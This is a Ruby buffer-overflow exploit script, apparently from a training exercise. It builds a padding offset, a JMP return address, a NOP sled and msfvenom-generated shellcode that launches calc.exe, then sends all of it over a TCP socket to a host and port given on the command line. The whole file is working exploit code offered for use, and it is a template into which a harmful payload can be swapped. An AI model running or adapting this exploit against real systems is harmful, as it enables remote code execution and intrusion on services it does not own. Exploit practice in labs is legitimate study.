require 'socket'

host = ARGV[0]
port = ARGV[1]


=begin
check BO cyber mentor notes in your obsidian vault
=end

offset = "\x88"*44
eip = "\x41\x41\x41\x41"
badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f" +
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" +
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f" +
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f" +
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f" +
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf" +
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf" +
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"


# jmp big endian 7c 86 46 7b
jmp = "\x7b\x46\x86\x7c"
nop = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
#32 bit calc
#msfvenom -p windows/exec CMD=calc.exe -b "\x00" -f rb
payload = "\xbe\x41\x3b\x15\xce\xda\xc3\xd9\x74\x24\xf4\x58\x29\xc9" +
"\xb1\x31\x83\xc0\x04\x31\x70\x0f\x03\x70\x4e\xd9\xe0\x32" +
"\xb8\x9f\x0b\xcb\x38\xc0\x82\x2e\x09\xc0\xf1\x3b\x39\xf0" +
"\x72\x69\xb5\x7b\xd6\x9a\x4e\x09\xff\xad\xe7\xa4\xd9\x80" +
"\xf8\x95\x1a\x82\x7a\xe4\x4e\x64\x43\x27\x83\x65\x84\x5a" +
"\x6e\x37\x5d\x10\xdd\xa8\xea\x6c\xde\x43\xa0\x61\x66\xb7" +
"\x70\x83\x47\x66\x0b\xda\x47\x88\xd8\x56\xce\x92\x3d\x52" +
"\x98\x29\xf5\x28\x1b\xf8\xc4\xd1\xb0\xc5\xe9\x23\xc8\x02" +
"\xcd\xdb\xbf\x7a\x2e\x61\xb8\xb8\x4d\xbd\x4d\x5b\xf5\x36" +
"\xf5\x87\x04\x9a\x60\x43\x0a\x57\xe6\x0b\x0e\x66\x2b\x20" +
"\x2a\xe3\xca\xe7\xbb\xb7\xe8\x23\xe0\x6c\x90\x72\x4c\xc2" +
"\xad\x65\x2f\xbb\x0b\xed\xdd\xa8\x21\xac\x8b\x2f\xb7\xca" +
"\xf9\x30\xc7\xd4\xad\x58\xf6\x5f\x22\x1e\x07\x8a\x07\xd0" +
"\x4d\x97\x21\x79\x08\x4d\x70\xe4\xab\xbb\xb6\x11\x28\x4e" +
"\x46\xe6\x30\x3b\x43\xa2\xf6\xd7\x39\xbb\x92\xd7\xee\xbc" +
"\xb6\xbb\x71\x2f\x5a\x12\x14\xd7\xf9\x6a"

input = offset + jmp + nop + payload

s = TCPSocket.new host, port

s.gets

s.puts input


